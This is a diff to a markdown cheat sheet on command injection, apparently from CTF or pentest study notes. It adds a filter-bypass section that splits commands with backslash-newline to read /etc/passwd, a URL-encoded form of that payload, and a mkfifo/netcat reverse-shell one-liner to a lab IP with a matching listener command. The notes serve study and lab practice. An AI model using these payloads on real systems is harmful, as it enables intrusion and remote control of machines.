@@ -21,3 +21,47 @@
 | ping    | This command will invoke the application to hang. This will be useful in testing an application for blind command injection.                                                           |
 | timeout | This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the `ping` command is not installed.                |
 
+
+
+## Filter Bypass
+
+[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)&#x20;
+
+
+
+### Bypass with backslash newline
+
+**Examples**
+
+[chill-hack.md](../../walkthroughs/tryhackme/chill-hack.md "mention")
+
+Commands can be broken into parts by using backslash followed by a newline
+
+```
+$ cat /et\
+c/pa\
+sswd
+```
+
+URL encoded form would look like this:
+
+```
+cat%20/et%5C%0Ac/pa%5C%0Asswd
+```
+
+
+
+**Web**
+
+```
+r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.186 1337 >/tmp/f
+```
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+
+
